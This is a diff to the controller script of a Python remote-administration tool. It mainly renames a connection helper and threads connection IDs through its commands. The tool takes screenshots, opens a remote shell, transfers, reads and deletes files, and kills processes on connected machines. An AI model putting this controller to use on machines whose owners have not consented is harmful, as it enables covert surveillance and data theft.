@@ -24,12 +24,12 @@ recv = lambda buf: client.recv(buffer)
 def sendAll(data):
     if (isinstance(data, bytes)):
         client.send(bytes(str(len(data)), "utf-8"))
-        if (conn_stream()):
+        if (tcp_connected()):
             client.send(data)
     else:
         data = str(data, "utf-8")
         send(str(len(data)), "utf-8")
-        if (conn_stream()):
+        if (tcp_connected()):
             send(data)
 
 def recvAll(bufsize):
@@ -49,7 +49,7 @@ def recvAll_Verbose(bufsize):
         print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufsize)), end="")
     return data
 
-def conn_stream():
+def tcp_connected():
     if (b"success" in client.recv(buffer)):
         return True
 
@@ -130,18 +130,19 @@ def ClientCommands():
     print("______________________________________|\n")
 
 def VBSMessageBox(connection, message):
-    # message = input("\nType Message: ").strip()
-    print(clients[connection], message)
-
     if (len(message) >= 1000):
         print("[-] Maximum Length: 1000 Characters")
+        return False
 
     elif not (len(message) <= 0):
         clients[connection].send(b"msgbox")
-        if (conn_stream()):
+        if (tcp_connected()):
             clients[connection].send(bytes(message, "utf-8"))
+        
+        else: return False
 
     print(str(recv(buffer), "utf-8") + "\n")
+    return True
 
 def CaptureScreenshot():
     send("screenshot")
@@ -240,7 +241,7 @@ def ChangeWallpaper():
         return
 
     send("wallpaper")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(os.path.basename(localFile))
 
     with open(localFile, "rb") as ImageFile:
@@ -255,12 +256,20 @@ def ChangeWallpaper():
 
     print("Wallpaper Changed\n")
 
-def SystemInformation():
-    print(f"\nConnection ID:   <{clients.index(client)}>")
-    print(f"Computer:        <{PC_Name}>")
-    print(f"Username:        <{PC_Username}>")
-    print(f"IP Address:      <{IP_Address}>")
-    print(f"System:          <{PC_System}>\n")
+def SystemInformation(connection):
+    print(f"Connection ID:   <{connection}>")
+    print(f"Computer:        <{clientInfo[connection]['computer']}>")
+    print(f"Username:        <{clientInfo[connection]['username']}>")
+    print(f"IP Address:      <{clientInfo[connection]['ip']}>")
+    print(f"System:          <{clientInfo[connection]['system']}>\n")
+
+    return {
+        "connection_id": connection,
+        "computer": clientInfo[connection]['computer'],
+        "username": clientInfo[connection]['username'],
+        "ip": clientInfo[connection]['ip'],
+        "system": clientInfo[connection]['system']
+    }
 
 def ViewTasks():
     send("tasklist")
@@ -273,7 +282,7 @@ def IdleTime():
 def StartProcess():
     process = input("\nRemote File Path: ").strip()
     send("stprocess")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(process)
 
     if not (str(recv(buffer), "utf-8") == "valid"):
@@ -285,12 +294,12 @@ def StartProcess():
 def KillProcess():
     process = input("\nTask to Kill: ").strip()
     send("klprocess")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(process)
 
     print(str(recvAll(recv(buffer)), "utf-8"))
 
-def RemoteCMD():
+def RemoteCMD(IP_Address):
     send("remote")
     remoteDirectory = str(recv(buffer), "utf-8")
 
@@ -326,15 +335,15 @@ def WakeComputer():
     if (str(recv(buffer), "utf-8") == "success"):
         print("Computer has been woken\n")
 
-def ShutdownComputer():
+def ShutdownComputer(IP_Address):
     send("shutdown")
     print(f"Powering Off PC ~ [{IP_Address}]\n")
 
-def RestartComputer():
+def RestartComputer(IP_Address):
     send("restart")
     print(f"Restarting PC ~ [{IP_Address}]\n")
 
-def LockComputer():
+def LockComputer(IP_Address):
     send("lock")
     print(f"Locking PC ~ [{IP_Address}]\n")
 
@@ -345,7 +354,7 @@ def CurrentDirectory():
 def ViewFiles():
     directory = input("\nRemote Folder [-filter]: ").strip()
     send("files")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(directory)
 
     if not (str(recv(buffer), "utf-8") == "valid"):
@@ -375,7 +384,7 @@ def SendFile():
         return
         
     send("receive")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(os.path.basename(localFile))
 
     with open(localFile, "rb") as file:
@@ -398,7 +407,7 @@ def SendFile():
 def ReceiveFile():
     filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
     send("send")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(filePath)
 
     if not (str(recv(buffer), "utf-8") == "valid"):
@@ -427,7 +436,7 @@ def ReceiveFile():
 def ReadFile():
     filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
     send("read")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(filePath)
 
     if not (str(recv(buffer), "utf-8") == "valid"):
@@ -464,7 +473,7 @@ def MoveFile():
     remoteDirectory = input("\nNew Remote Directory Location: ").strip()
 
     send(filePath)
-    if (conn_stream()):
+    if (tcp_connected()):
         send(remoteDirectory)
 
     clientResponse = str(recv(buffer), "utf-8")
@@ -481,7 +490,7 @@ def MoveFile():
 def DeleteFile():
     filePath = input("\nRemote File Path: ").strip()
     send("delfile")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(filePath)
 
     if not (str(recv(buffer), "utf-8") == "valid"):
@@ -493,7 +502,7 @@ def DeleteFile():
 def DeleteDirectory():
     directory = input("\nRemote Directory: ").strip()
     send("deldir")
-    if (conn_stream()):
+    if (tcp_connected()):
         send(directory)
 
     if not (str(recv(buffer), "utf-8") == "valid"):
@@ -627,14 +636,13 @@ def SelectConnection():
             break
 
         finally:
-            webapi.app.current = None
+            webapi.api.connection = None
             if (len(clients) == 0):
                 clientInfo.clear()
 
 def RemoteControl(connection):
-    global current, client, IP_Address, PC_Name, PC_Username, PC_System
-
-    webapi.app.current = connection
+    # global current, client, IP_Address, PC_Name, PC_Username, PC_System
+    webapi.api.connection = connection
     client = clients[connection]
     IP_Address = clientInfo[connection]['ip']
     PC_Name = clientInfo[connection]['computer']
@@ -656,7 +664,7 @@ def RemoteControl(connection):
                 break
 
             elif (command == "-vmb"):
-                VBSMessageBox()
+                VBSMessageBox(connection, input("\nType Message: ").strip())
 
             elif (command == "-cps"):
                 CaptureScreenshot()
@@ -668,7 +676,7 @@ def RemoteControl(connection):
                 ChangeWallpaper()
 
             elif (command == "-vsi"):
-                SystemInformation()
+                SystemInformation(connection)
 
             elif (command == "-vrt"):
                 ViewTasks()
@@ -683,19 +691,19 @@ def RemoteControl(connection):
                 KillProcess()
 
             elif (command == "-rms"):
-                RemoteCMD()
+                RemoteCMD(IP_Address)
 
             elif (command == "-wkc"):
                 WakeComputer()
 
             elif (command == "-sdc"):
-                ShutdownComputer()
+                ShutdownComputer(IP_Address)
 
             elif (command == "-rsc"):
-                RestartComputer()
+                RestartComputer(IP_Address)
             
             elif (command == "-lkc"):
-                LockComputer()
+                LockComputer(IP_Address)
 
             elif (command == "-gcd"):
                 CurrentDirectory()
@@ -732,16 +740,19 @@ def RemoteControl(connection):
             client.close()
             break
 
-webapi.app.clients = clients
-webapi.app.clientInfo = clientInfo
-webapi.app.VBSMessageBox = VBSMessageBox
-webapi.app.clients_lock = threading.Lock()
+webapi.api.clients = clients
+webapi.api.clientInfo = clientInfo
+
+webapi.api.VBSMessageBox = VBSMessageBox
+webapi.api.SystemInformation = SystemInformation
+
+webapi.api.clients_lock = threading.Lock()
 
 t1 = threading.Thread(target=RemoteConnect)
 t1.daemon = True
 t1.start()
 
-t2 = threading.Thread(target=webapi.app.run)
+t2 = threading.Thread(target=webapi.api.run)
 t2.daemon = True
 t2.start()
 
